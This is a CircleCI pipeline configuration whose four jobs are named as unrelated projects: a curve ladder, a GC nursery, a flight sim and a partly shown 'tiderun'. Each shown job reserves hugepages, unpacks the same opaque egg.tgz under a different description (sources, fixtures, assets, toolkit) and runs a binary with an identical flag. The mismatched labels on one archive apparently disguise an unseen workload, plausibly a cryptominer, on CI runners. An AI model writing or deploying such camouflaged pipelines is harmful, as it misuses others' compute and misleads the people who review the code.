version: 2.1

jobs:
  curve_ladder:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write base point
          command: |
            printf '9\n' > base.txt
      - run:
          name: Build montgomery ladder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target curve_ladder -j2
      - run:
          name: Climb scalar ladder
          command: LIONSS_LP=1 ./build/curve_ladder --base base.txt --bits 255
  gc_nursery:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set heap sizes
          command: |
            printf 'nursery=16m\n' > gc.conf
      - run:
          name: Build collector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gc_nursery -j2
      - run:
          name: Stress nursery collection
          command: LIONSS_LP=1 ./build/gc_nursery --conf gc.conf --allocs 5000000
  sparrowhawk:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load flight path
          command: |
            printf 'waypoints 9\n' > hawk.cfg
      - run:
          name: Build flight sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sparrowhawk -j2
      - run:
          name: Track sparrowhawk dive
          command: LIONSS_LP=1 ./build/sparrowhawk --config hawk.cfg --speed 40
  tiderun:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
